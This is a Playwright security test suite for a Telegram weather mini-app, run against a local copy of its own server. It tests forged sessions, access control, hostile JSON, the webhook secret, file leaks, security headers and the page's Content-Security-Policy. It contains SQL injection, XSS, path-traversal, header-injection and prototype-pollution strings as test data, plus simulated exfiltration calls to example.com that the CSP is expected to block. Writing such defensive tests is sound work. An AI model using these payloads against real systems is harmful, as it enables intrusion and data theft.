/**
 * Security assessment, automated part (docs/SECURITY-ASSESSMENT.md). Runs against the REAL Worker on localhost with
 * mock external services. Test IDs (SEC-…) match the assessment document.
 *
 * These are attacks on our own local copy only. Nothing here is aimed at production or at third-party services.
 */
import { expect, test, type APIRequestContext } from "@playwright/test";
import { ACTIVE, PENDING, STRANGER, openApp, ready, signInitData, telegramCalls } from "./helpers";

const BASE = "http://127.0.0.1:18790";
const WEBHOOK_SECRET = "e2e_secret"; // scripts/e2e-server.mjs
const auth = (id = ACTIVE) => ({ authorization: `tma ${signInitData(id)}` });
const dashboard = async (request: APIRequestContext, id = ACTIVE) => (await request.get("/api/app/dashboard", { headers: auth(id) })).json();

let updateId = 900_000;
const webhook = (body: unknown, secret: string | null = WEBHOOK_SECRET, extra: Record<string, string> = {}) =>
  fetch(`${BASE}/webhook`, {
    method: "POST",
    headers: { "content-type": "application/json", ...(secret === null ? {} : { "X-Telegram-Bot-Api-Secret-Token": secret }), ...extra },
    body: typeof body === "string" ? body : JSON.stringify({ update_id: updateId++, ...(body as object) }),
  });
const say = (id: number, text: string) => webhook({ message: { message_id: 1, from: { id, first_name: `U${id}` }, chat: { id, type: "private" }, text } });
const pause = (ms: number) => new Promise((r) => setTimeout(r, ms));

async function reset(request: APIRequestContext) {
  await request.post("/api/app/settings", { headers: auth(), data: { lang: "en", tempUnit: "c", windUnit: "kmh", clock: "auto", dailyOn: true, dailyTime: "08:30", eveningOn: false, rainAlerts: false, aqiAlert: 0, warningsOn: true } });
  await request.post("/api/app/place", { headers: auth(), data: { preset: 0 } });
  for (let guard = 0; guard < 8; guard++) {
    const d = await dashboard(request);
    const extra = d.places.findIndex((p: { active: boolean }) => !p.active);
    if (extra < 0) break;
    await request.post("/api/app/place/remove", { headers: auth(), data: { saved: extra } });
  }
}
test.beforeAll(async ({ request }) => reset(request));
test.afterAll(async ({ request }) => reset(request));

// ================================================================== A. Authentication
test("SEC-A1 forged and malformed sessions are refused on every protected endpoint", async ({ request }) => {
  const good = signInitData(ACTIVE);
  const forged: Record<string, string> = {
    "no header": "",
    "empty tma": "tma ",
    "wrong scheme (Bearer)": `Bearer ${good}`,
    "scheme in capitals": `TMA ${good}`,
    "hash in capitals": `tma ${good.replace(/hash=([0-9a-f]+)/, (_m, h: string) => `hash=${h.toUpperCase()}`)}`,
    "hash truncated": `tma ${good.replace(/hash=([0-9a-f]{60})[0-9a-f]{4}/, "hash=$1")}`,
    "hash all zeros": `tma ${good.replace(/hash=[0-9a-f]+/, `hash=${"0".repeat(64)}`)}`,
    "second user appended": `tma ${good}&user=${encodeURIComponent(JSON.stringify({ id: STRANGER }))}`,
    "second hash prepended": `tma hash=${"a".repeat(64)}&${good}`,
    "auth_date pushed forward": `tma ${good.replace(/auth_date=\d+/, `auth_date=${Math.floor(Date.now() / 1000) + 10}`)}`,
    "signed with the secret and message swapped": `tma ${signInitData(ACTIVE, { token: "WebAppData" })}`,
    "signed by another bot": `tma ${signInitData(ACTIVE, { token: "111:other" })}`,
    "expired (25 hours)": `tma ${signInitData(ACTIVE, { ageSeconds: 25 * 3600 })}`,
    "very long": `tma ${"a=1&".repeat(3000)}hash=${"a".repeat(64)}`,
    "null bytes": `tma user=%00&hash=${"a".repeat(64)}`,
  };
  const endpoints: [string, string][] = [["GET", "/api/app/dashboard"], ["GET", "/api/app/places?q=ipoh"], ["POST", "/api/app/place"], ["POST", "/api/app/place/remove"], ["POST", "/api/app/place/edit"], ["POST", "/api/app/settings"], ["POST", "/api/app/share"]];
  for (const [name, header] of Object.entries(forged)) {
    for (const [method, path] of endpoints) {
      const res = await request.fetch(path, { method, headers: header ? { authorization: header } : {}, data: method === "POST" ? { preset: 1, saved: 0, action: "home", tempUnit: "f" } : undefined });
      expect(res.status(), `${name} → ${method} ${path}`).toBe(401);
      expect((await res.json()).error.code).toBe("unauthorized");
    }
  }
  expect((await dashboard(request)).place, "nothing was changed by any of them").toBe("Kuala Lumpur, Malaysia");
  expect((await dashboard(request)).settings.tempUnit).toBe("c");
});

test("SEC-A2 the session can't be passed any other way (query string, cookie, body)", async ({ request }) => {
  const good = encodeURIComponent(signInitData(ACTIVE));
  expect((await request.get(`/api/app/dashboard?initData=${good}&tma=${good}&authorization=${good}`)).status()).toBe(401);
  expect((await request.get("/api/app/dashboard", { headers: { cookie: `initData=${good}; authorization=tma ${good}` } })).status()).toBe(401);
  expect((await request.post("/api/app/settings", { data: { tempUnit: "f", initData: signInitData(ACTIVE) } })).status()).toBe(401);
});

// ================================================================== B. Authorisation
test("SEC-B1 access is checked on every request: blocking someone takes effect at once", async ({ request }) => {
  const victim = 6006;
  await say(ACTIVE, `/allow ${victim}`); // the admin approves a new person
  await pause(1500);
  await say(victim, "/start");
  await pause(2000);
  const before = await request.get("/api/app/dashboard", { headers: auth(victim) });
  expect(before.status(), "approved person gets in").toBe(200);
  const session = auth(victim); // the same signed session is reused below: still valid for 24 hours by signature
  await say(ACTIVE, `/block ${victim}`);
  await pause(1500);
  for (const [method, path] of [["GET", "/api/app/dashboard"], ["GET", "/api/app/places?q=ipoh"], ["POST", "/api/app/settings"], ["POST", "/api/app/place"], ["POST", "/api/app/share"]] as const) {
    const res = await request.fetch(path, { method, headers: session, data: method === "POST" ? { tempUnit: "f", preset: 1 } : undefined });
    expect(res.status(), `${method} ${path} after blocking`).toBe(403);
    expect((await res.json()).error.code).toBe("denied");
  }
});

test("SEC-B2 one person can never read or change another person's data", async ({ request }) => {
  // every endpoint acts on the id inside the SIGNED session; extra ids anywhere else are ignored
  const tricks = ["?user=1001", "?chat_id=1001", "?id=1001&userId=1001"];
  for (const q of tricks) expect((await request.get(`/api/app/dashboard${q}`, { headers: auth(PENDING) })).status(), q).toBe(403);
  const res = await request.post("/api/app/settings", { headers: auth(), data: { tempUnit: "f", chatId: 6006 } });
  expect(res.status(), "an id in the body is not a known setting: the whole change is refused").toBe(400);
  const headers = { ...auth(PENDING), "x-user-id": String(ACTIVE), "x-forwarded-user": String(ACTIVE), "x-telegram-user-id": String(ACTIVE) };
  expect((await request.get("/api/app/dashboard", { headers })).status(), "identity headers are ignored").toBe(403);
  expect((await dashboard(request)).settings.tempUnit).toBe("c");
});

test("SEC-B3 no admin function is reachable through the web API, and chat admin commands need an admin", async ({ request }) => {
  for (const path of ["/api/app/users", "/api/app/admin", "/api/app/broadcast", "/api/app/status", "/api/users", "/api/admin", "/admin", "/status", "/users"]) {
    const res = await request.get(path, { headers: { ...auth(), accept: "application/json" } });
    expect(res.status(), path).toBe(404);
  }
  const before = (await telegramCalls()).length;
  await say(PENDING, "/broadcast hello everyone");
  await say(PENDING, "/users");
  await say(PENDING, `/allow ${PENDING}`);
  await pause(2000);
  const sent = (await telegramCalls()).slice(before).filter((c) => c.method === "sendMessage").map((c) => c.text);
  expect(sent.some((t) => /Broadcast preview|Users \(|Allowed/.test(t)), "a non-admin got an admin answer").toBe(false);
  expect((await request.get("/api/app/dashboard", { headers: auth(PENDING) })).status(), "and could not approve themselves").toBe(403);
});

// ================================================================== C. Input handling
const HOSTILE_JSON = [
  "null", "true", "123", '"text"', "[]", "[1,2,3]", "{}", "{", '{"saved":', "not json at all", "",
  '{"saved":1e309}', '{"saved":1.5}', '{"saved":"0"}', '{"saved":{"$gt":0}}', '{"saved":[0]}', '{"saved":null}', '{"saved":9007199254740993}',
  '{"preset":-1}', '{"preset":1e3}', '{"preset":"1 OR 1=1"}', '{"pick":-1}', '{"pick":99}',
  '{"lat":"NaN","lon":0}', '{"lat":1e400,"lon":0}', '{"lat":null,"lon":null}', '{"lat":[3],"lon":[101]}', '{"lat":3.1,"lon":"101; DROP TABLE users"}',
  '{"constructor":{"prototype":{"admin":true}}}', '{"__proto__":{"status":"active","admin":true}}',
  '{"lang":"constructor"}', '{"lang":"__proto__"}', '{"lang":"toString"}', '{"lang":"hasOwnProperty"}', '{"lang":["en"]}', '{"lang":"en\\u0000"}',
  '{"tempUnit":["c"]}', '{"tempUnit":{"toString":"c"}}', '{"clock":24}',
  '{"dailyTime":"08:30\'; DROP TABLE users;--"}', '{"dailyTime":"<script>alert(1)</script>"}',
  '{"aqiAlert":"151"}', '{"aqiAlert":-1}', '{"status":"active"}', '{"region":"Selangor"}', '{"placeName":"<img src=x onerror=alert(1)>"}',
  '{"action":"home"}', '{"action":"__proto__","saved":0}', '{"action":"home","saved":"0"}', '{"action":["home"],"saved":0}',
  '{"a":"' + "A".repeat(400) + '"}', JSON.stringify({ deep: "[".repeat(200) }),
];

test("SEC-C1 hostile JSON never crashes an endpoint, never echoes back, never half-applies", async ({ request }) => {
  const before = await dashboard(request);
  const endpoints = ["/api/app/place", "/api/app/place/remove", "/api/app/place/edit", "/api/app/settings"];
  const serverErrors: string[] = [];
  for (const path of endpoints) {
    for (const body of HOSTILE_JSON) {
      const res = await request.post(path, { headers: { ...auth(), "content-type": "application/json" }, data: Buffer.from(body) });
      const text = await res.text();
      if (res.status() >= 500) serverErrors.push(`${res.status()} ${path} ${body.slice(0, 50)}`);
      // /api/app/place ignores unknown extra keys, so a body that also carries a valid choice (e.g. "saved": 0, the
      // place we are already at) is a legitimate request. Everything else must be refused outright.
      const validChoice = path === "/api/app/place" && /"saved":0[,}]/.test(body);
      expect(res.status(), `${path} ${body.slice(0, 50)}`).toBe(validChoice ? 200 : 400);
      expect(res.headers()["content-type"]).toContain("application/json");
      expect(/DROP TABLE|<script|onerror|\bat .+:\d+:\d+|Error:|stack/i.test(text), `no echo or stack trace: ${text.slice(0, 80)}`).toBe(false);
    }
  }
  expect(serverErrors).toEqual([]);
  const after = await dashboard(request);
  expect(after.settings, "settings untouched").toEqual(before.settings);
  expect(after.places, "places untouched").toEqual(before.places);
  expect(after.lang).toBe("en");

  // White space around a time is tolerated, but what is STORED is always the clean, checked value, never the raw text.
  const padded = await request.post("/api/app/settings", { headers: { ...auth(), "content-type": "application/json" }, data: Buffer.from('{"dailyTime":" 08:30\\n"}') });
  expect(padded.status()).toBe(200);
  expect((await padded.json()).settings.dailyTime).toBe("08:30");
});

test("SEC-C2 hostile search text is handled as plain text", async ({ request, page }) => {
  const attacks = ["' OR '1'='1", "\"; DROP TABLE users; --", "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "../../etc/passwd", "%00", "{{7*7}}", "${7*7}", "ipoh\r\nX-Injected: 1", "🙂".repeat(20), "ａｄｍｉｎ", "‮evil"];
  for (const q of attacks) {
    const res = await request.get(`/api/app/places?q=${encodeURIComponent(q)}`, { headers: auth() });
    expect([200, 400], q).toContain(res.status());
    expect(res.headers()["x-injected"], "no header injection").toBeUndefined();
    if (res.status() === 200) expect(await res.json()).toEqual({ results: [] });
  }
  expect((await request.get(`/api/app/places?q=${"a".repeat(5000)}`, { headers: auth() })).status()).toBe(400);
  expect((await dashboard(request)).place, "the users table is still there").toBe("Kuala Lumpur, Malaysia");

  // and in the page: typed markup stays text
  await openApp(page, { userId: ACTIVE });
  await ready(page);
  await page.locator("#place-btn").click();
  await page.locator("#search-input").fill('<img src=x onerror="window.__xss=1">');
  await page.locator("#search-btn").click();
  await expect(page.locator("#sheet-status")).toContainText("No place found");
  expect(await page.evaluate(() => (window as any).__xss)).toBeUndefined();
});

test("SEC-C3 oversized requests are refused without being processed", async ({ request }) => {
  const big = Buffer.from(JSON.stringify({ tempUnit: "f", pad: "x".repeat(2_000_000) }));
  for (const path of ["/api/app/settings", "/api/app/place", "/api/app/place/edit", "/api/app/place/remove"]) {
    const res = await request.post(path, { headers: { ...auth(), "content-type": "application/json" }, data: big });
    expect([400, 413], `${path} 2 MB body`).toContain(res.status());
  }
  await pause(1600);
  const huge = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(5_000_000, 1)]);
  expect((await request.post("/api/app/share", { headers: { ...auth(), "content-type": "image/jpeg" }, data: huge })).status(), "5 MB picture").toBe(413);
  expect((await dashboard(request)).settings.tempUnit).toBe("c");
});

test("SEC-C4 a picture sent without a declared length can't slip past the size limit", async () => {
  await pause(1600);
  // a streamed body has no Content-Length: the server must stop reading at the limit instead of trusting the header
  const chunk = Buffer.alloc(64 * 1024, 1);
  let sent = 0;
  const stream = new ReadableStream<Uint8Array>({
    pull(controller) {
      if (sent === 0) controller.enqueue(new Uint8Array([0xff, 0xd8, 0xff, 0xe0]));
      if (sent >= 3_000_000) return controller.close();
      controller.enqueue(new Uint8Array(chunk));
      sent += chunk.length;
    },
  });
  const res = await fetch(`${BASE}/api/app/share`, { method: "POST", headers: { ...auth(), "content-type": "image/jpeg" }, body: stream, duplex: "half" } as RequestInit).catch((e) => ({ status: 0, error: String(e) }) as unknown as Response);
  expect([413, 0], "refused, or the connection was cut once the limit was passed").toContain(res.status);
  const calls = await telegramCalls();
  expect(calls.filter((c) => c.method === "sendPhoto" && c.bytes > 1_000_000), "nothing oversized reached Telegram").toEqual([]);
});

// ================================================================== D. The webhook and /setup
test("SEC-D1 the webhook only obeys Telegram's secret, and survives rubbish", async () => {
  expect((await webhook({ message: {} }, null)).status, "no secret").toBe(403);
  expect((await webhook({ message: {} }, "")).status, "empty secret").toBe(403);
  expect((await webhook({ message: {} }, "wrong")).status).toBe(403);
  expect((await webhook({ message: {} }, WEBHOOK_SECRET.slice(0, -1))).status, "one character short").toBe(403);
  expect((await webhook({ message: {} }, WEBHOOK_SECRET + "x")).status, "one character long").toBe(403);
  expect((await webhook({ message: {} }, WEBHOOK_SECRET.toUpperCase())).status, "wrong case").toBe(403);
  expect((await fetch(`${BASE}/webhook?secret=${WEBHOOK_SECRET}&key=${WEBHOOK_SECRET}`, { method: "POST", body: "{}" })).status, "secret in the URL is not accepted").toBe(403);
  expect((await fetch(`${BASE}/webhook`, { headers: { "X-Telegram-Bot-Api-Secret-Token": WEBHOOK_SECRET } })).status, "GET is not a webhook").toBe(404);
  expect((await webhook("this is not json")).status).toBe(400);
  // with the right secret, malformed updates are accepted (so Telegram doesn't retry) and must not break anything
  for (const junk of [{}, { message: null }, { message: { chat: null } }, { message: { chat: { id: "x", type: "private" }, from: { id: "x" }, text: 5 } }, { callback_query: {} }, { callback_query: { id: "1", from: { id: ACTIVE }, data: "lang:constructor", message: { message_id: 1, chat: { id: ACTIVE, type: "private" } } } }, { callback_query: { id: "2", from: { id: PENDING }, data: "adm:ok:" + PENDING, message: { message_id: 1, chat: { id: PENDING, type: "private" } } } }, { callback_query: { id: "3", from: { id: PENDING }, data: "bc:ok", message: { message_id: 1, chat: { id: PENDING, type: "private" } } } }, { inline_query: { id: "1", from: { id: ACTIVE }, query: "x".repeat(5000) } }, { message: { message_id: 1, chat: { id: -100123, type: "supergroup" }, from: { id: ACTIVE }, text: "/broadcast hi" } }]) {
    expect((await webhook(junk)).status, JSON.stringify(junk).slice(0, 60)).toBe(200);
  }
  await pause(2500);
  expect((await fetch(`${BASE}/`)).status, "still alive").toBe(200);
});

test("SEC-D2 forged updates can't grant access or change the language to a non-language", async ({ request }) => {
  // a NON-admin presses "approve" on themselves, from their own chat (SEC-D1 sent the same thing among its rubbish)
  await webhook({ callback_query: { id: "9", from: { id: PENDING }, data: `adm:ok:${PENDING}`, message: { message_id: 1, chat: { id: PENDING, type: "private" } } } });
  await pause(1500);
  expect((await request.get("/api/app/dashboard", { headers: auth(PENDING) })).status(), "self-approval").toBe(403);
  // a language button whose value is not a language (but IS the name of something every JavaScript object has)
  await webhook({ callback_query: { id: "10", from: { id: ACTIVE }, data: "lang:constructor", message: { message_id: 1, chat: { id: ACTIVE, type: "private" } } } });
  await pause(1500);
  const d = await dashboard(request);
  expect(d.lang, "a language named 'constructor'").toBe("en");
  expect(d.settings.lang).toBe("en");
});

test("SEC-D3 /setup needs its key", async () => {
  expect((await fetch(`${BASE}/setup`)).status).toBe(403);
  expect((await fetch(`${BASE}/setup?key=`)).status).toBe(403);
  expect((await fetch(`${BASE}/setup?key=wrong`)).status).toBe(403);
  expect((await fetch(`${BASE}/setup?key=${WEBHOOK_SECRET}x`)).status).toBe(403);
  expect((await fetch(`${BASE}/setup?menu=app`)).status).toBe(403);
  expect((await fetch(`${BASE}/setup`, { headers: { "X-Telegram-Bot-Api-Secret-Token": WEBHOOK_SECRET } })).status, "the webhook header is not a setup key").toBe(403);
});

// ================================================================== E. What the server gives away
test("SEC-E1 nothing outside public/ is served", async ({ request }) => {
  const paths = [
    "/secrets.json", "/.dev.vars", "/.env", "/wrangler.jsonc", "/package.json", "/package-lock.json", "/.git/config", "/.git/HEAD", "/.gitignore",
    "/src/index.ts", "/src/miniapp.ts", "/migrations/0001_init.sql", "/docs/DESIGN.md", "/README.md", "/_headers", "/node_modules/wrangler/package.json",
    "/app/../wrangler.jsonc", "/app/..%2f..%2fsecrets.json", "/app/%2e%2e/%2e%2e/secrets.json", "/app/....//secrets.json", "/app/..\\..\\secrets.json", "/fonts/../../secrets.json",
    "/app/app.js.map", "/app/.DS_Store", "/app/", "/cdn-cgi/handler/scheduled",
  ];
  const leaked: string[] = [];
  for (const p of paths) {
    const res = await fetch(BASE + p, { redirect: "manual" });
    const body = await res.text();
    if (p === "/app/") {
      expect(res.status).toBe(200);
      continue;
    }
    if (p === "/cdn-cgi/handler/scheduled") continue; // only exists under `wrangler dev --test-scheduled`; never in production
    if (res.status === 200 || /TELEGRAM_BOT_TOKEN|WEBHOOK_SECRET|database_id|"devDependencies"|CREATE TABLE/.test(body)) leaked.push(`${res.status} ${p}`);
  }
  expect(leaked).toEqual([]);
});

test("SEC-E2 errors and answers reveal nothing internal", async ({ request }) => {
  const probes = [
    await request.get("/api/app/dashboard"),
    await request.get("/api/app/nope"),
    await request.post("/api/app/settings", { headers: auth(), data: { nope: 1 } }),
    await request.get("/definitely-not-here", { headers: { accept: "text/html" } }),
    await request.get("/setup?key=wrong"),
    await request.get("/api/app/demo?scene=%3Cscript%3Ealert(1)%3C/script%3E"),
  ];
  for (const res of probes) {
    const text = await res.text();
    expect(/testtoken|e2e_secret|waqitest|D1_ERROR|SQLITE|at \w+ \(|\.ts:\d+|node_modules|wrangler/i.test(text), `${res.url()} leaks: ${text.slice(0, 100)}`).toBe(false);
    expect(text.includes("<script>alert(1)</script>"), "input reflected").toBe(false);
    expect(res.headers()["server"] ?? "", "no version banner").not.toMatch(/\d+\.\d+/);
    expect(res.headers()["x-powered-by"]).toBeUndefined();
  }
  const d = JSON.stringify(await dashboard(request));
  for (const field of ["chatId", "chat_id", "username", "firstName", "searchJson", "lastSent", "warnSeen", "status", '"lat"', '"lon"']) {
    expect(d.includes(field), `the dashboard carries "${field}"`).toBe(false);
  }
});

test("SEC-E3 security headers on every kind of answer", async ({ request }) => {
  const page = (await request.get("/app/")).headers();
  expect(page["content-security-policy"]).toContain("default-src 'none'");
  expect(page["content-security-policy"]).toContain("frame-ancestors https://web.telegram.org");
  expect(page["content-security-policy"]).not.toMatch(/unsafe-inline|unsafe-eval|\*/);
  expect(page["x-content-type-options"]).toBe("nosniff");
  expect(page["referrer-policy"]).toBe("no-referrer");
  expect(page["strict-transport-security"], "HSTS on pages").toMatch(/max-age=\d{7,}/);
  expect(page["permissions-policy"]).toContain("camera=()");
  for (const asset of ["/app/app.js", "/app/app.css", "/fonts/plus-jakarta-sans-latin.woff2", "/404.html"]) {
    const h = (await request.get(asset)).headers();
    expect(h["x-content-type-options"], asset).toBe("nosniff");
  }
  const api = (await request.get("/api/app/dashboard", { headers: auth() })).headers();
  expect(api["cache-control"]).toBe("no-store");
  expect(api["x-content-type-options"]).toBe("nosniff");
  expect(api["access-control-allow-origin"], "no cross-origin reading of the API").toBeUndefined();
  for (const path of ["/", "/nope-plain", "/setup?key=wrong"]) {
    const h = (await fetch(BASE + path)).headers;
    expect(h.get("x-content-type-options"), `nosniff on ${path}`).toBe("nosniff");
  }
});

test("SEC-E4 other websites can't call the API on a person's behalf", async ({ request }) => {
  const preflight = await request.fetch("/api/app/settings", { method: "OPTIONS", headers: { origin: "https://evil.example", "access-control-request-method": "POST", "access-control-request-headers": "authorization,content-type" } });
  expect(preflight.headers()["access-control-allow-origin"], "no CORS permission is given").toBeUndefined();
  expect([404, 405]).toContain(preflight.status());
  const res = await request.get("/api/app/dashboard", { headers: { ...auth(), origin: "https://evil.example" } });
  expect(res.headers()["access-control-allow-origin"]).toBeUndefined();
  for (const method of ["PUT", "DELETE", "PATCH", "TRACE", "HEAD"]) {
    const r = await request.fetch("/api/app/settings", { method, headers: auth(), data: method === "HEAD" || method === "TRACE" ? undefined : { tempUnit: "f" } });
    expect([404, 405], method).toContain(r.status());
  }
  expect((await dashboard(request)).settings.tempUnit).toBe("c");
});

// ================================================================== F. The page itself
test("SEC-F1 the Content-Security-Policy really blocks injected scripts, outside requests and framing", async ({ page }) => {
  const violations: string[] = [];
  await page.exposeFunction("__csp", (v: string) => violations.push(v));
  await page.addInitScript(() => document.addEventListener("securitypolicyviolation", (e) => (window as any).__csp(`${e.violatedDirective} ${e.blockedURI}`)));
  await openApp(page, { userId: ACTIVE });
  await ready(page);
  const result = await page.evaluate(async () => {
    const out: Record<string, unknown> = {};
    const inline = document.createElement("script");
    inline.textContent = "window.__inlineRan = true";
    document.body.append(inline);
    out.inlineScript = (window as any).__inlineRan === true;
    const handler = document.createElement("img");
    handler.setAttribute("onerror", "window.__handlerRan = true");
    handler.src = "data:image/png;base64,AAAA";
    document.body.append(handler);
    await new Promise((r) => setTimeout(r, 300));
    out.inlineHandler = (window as any).__handlerRan === true;
    try {
      // eslint-disable-next-line no-eval
      out.eval = (0, eval)("1+1") === 2;
    } catch {
      out.eval = false;
    }
    out.outsideFetch = await fetch("https://example.com/steal?d=1", { mode: "no-cors" }).then(() => true, () => false);
    out.outsideImage = await new Promise((resolve) => {
      const img = new Image();
      img.onload = () => resolve(true);
      img.onerror = () => resolve(false);
      img.src = "https://example.com/pixel.png?stolen=1";
    });
    const style = document.createElement("style");
    style.textContent = "body{display:none}";
    document.head.append(style);
    out.inlineStyle = getComputedStyle(document.body).display === "none";
    return out;
  });
  expect(result).toEqual({ inlineScript: false, inlineHandler: false, eval: false, outsideFetch: false, outsideImage: false, inlineStyle: false });
  expect(violations.length, "the browser reported the blocked attempts").toBeGreaterThanOrEqual(4);
});

test("SEC-F2 hostile text from any data source is shown as text, in every card", async ({ page }) => {
  const PAYLOAD = '"><img src=x onerror="window.__xss=1"><script>window.__xss=1</script>';
  await page.route("**/api/app/dashboard**", async (r) => {
    const res = await r.fetch();
    const poison = (v: unknown): unknown => (typeof v === "string" ? PAYLOAD : Array.isArray(v) ? v.map(poison) : v && typeof v === "object" ? Object.fromEntries(Object.entries(v).map(([k, x]) => [k, k === "icon" || k === "kind" || k === "level" || k === "lang" || ["tempUnit", "windUnit", "clock", "dailyTime", "eveningTime", "tz"].includes(k) ? x : poison(x)])) : v);
    const d = await res.json();
    const poisoned = poison(d) as Record<string, unknown>;
    poisoned.warnings = [{ title: PAYLOAD, until: PAYLOAD, valid: PAYLOAD, area: PAYLOAD, text: PAYLOAD, instruction: PAYLOAD }];
    await r.fulfill({ response: res, json: poisoned });
  });
  await openApp(page, { userId: ACTIVE });
  await ready(page);
  await page.locator("#days .day").nth(1).click();
  await page.locator("#place-btn").click();
  await page.keyboard.press("Escape");
  await page.locator("#settings-btn").click();
  await page.keyboard.press("Escape");
  await page.locator("#share-btn").click();
  await page.keyboard.press("Escape");
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => (window as any).__xss), "no injected code ran").toBeUndefined();
  expect(await page.locator("#app img, #app script, dialog img, dialog script, #app iframe").count(), "no injected elements").toBe(0);
  await expect(page.locator("#place-name")).toHaveText(PAYLOAD);
});

test("SEC-F3 nothing sensitive is kept on the device", async ({ page }) => {
  await openApp(page, { userId: ACTIVE });
  await ready(page);
  const stored = await page.evaluate(() => JSON.stringify({ local: { ...localStorage }, session: { ...sessionStorage }, cookies: document.cookie }));
  expect(/hash=|auth_date|tma |testtoken|query_id/.test(stored), "no session or token in storage").toBe(false);
  expect(JSON.parse(stored).cookies, "no cookies at all").toBe("");
  const requests: string[] = [];
  page.on("request", (r) => requests.push(r.url()));
  await page.reload();
  await ready(page);
  expect(requests.filter((u) => !u.startsWith(BASE) && !u.startsWith("https://telegram.org/")), "the page talks only to its own server and Telegram's script").toEqual([]);
  expect(requests.filter((u) => /hash=|auth_date=/.test(u)), "the session is never put in a URL").toEqual([]);
});
